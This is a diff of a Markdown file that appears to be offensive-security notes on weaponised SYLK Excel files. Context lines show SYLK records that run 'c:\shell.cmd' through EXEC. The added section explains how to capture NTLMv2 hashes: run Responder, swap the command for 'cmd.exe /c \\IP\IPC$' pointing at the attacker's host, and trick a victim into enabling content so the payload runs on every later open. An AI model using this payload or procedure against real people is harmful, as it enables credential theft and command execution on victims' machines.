@@ -41,12 +41,17 @@ C;X1;Y101;K0;EEXEC("c:\shell.cmd")
 C;X1;Y102;K0;EHALT()
 E
 ```
+2. DONE `HOLY SHIT THAT WAS HARD!!`
 
-2. DONE `HOLY SHIT THAT WAS HARD`
+#### Capture NTLMv2 Hash
 
+Setup Responder `./Responder.py -I ens4 -vvv`
 
-#### CApture NTLMv2 Hash
+Replace `c:\shell.cmd` with `cmd.exe /c \\IP\IPC$`. Please make sure the IP is your IP.
 
+Once the file.slk is opened the user will need to click on `Enable Content`. Once the user clicks the button the payload is executed. Once the button is clicked Excel, every time after that the payload will be executed when the file is openned (Unless the files is renamed).
+
+![](excel_NTLMv2_hash.gif)
 
 
 
